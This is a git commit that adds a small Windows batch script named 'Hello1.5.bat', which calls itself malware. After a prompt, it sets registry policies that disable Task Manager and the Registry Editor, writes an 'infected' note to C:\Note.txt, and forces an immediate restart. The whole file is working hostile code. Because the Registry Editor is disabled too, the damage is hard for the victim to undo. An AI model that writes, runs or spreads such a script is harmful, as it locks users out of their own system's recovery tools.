290610e1a3b4175d4e96304284a3a6b039888b7e
Taha <164132872+TahaTheSmartProGuy@users.noreply.github.com>
2024-04-08 13:21:34 +0300

    Add files via upload

---
+++ Hello1.5.bat
@@ -0,0 +1,8 @@
+@Echo off 
+Title Warning!
+Echo This Malware Disables Only TaskMgr Do You Want To Run it?
+Pause
+Reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f 
+Reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f 
+Echo Your PC Has Been infected By Hello1.5 By Taha 2.0.2.4 This Malware is Safety! >"C:\Note.txt"
+Shutdown /r /t 0
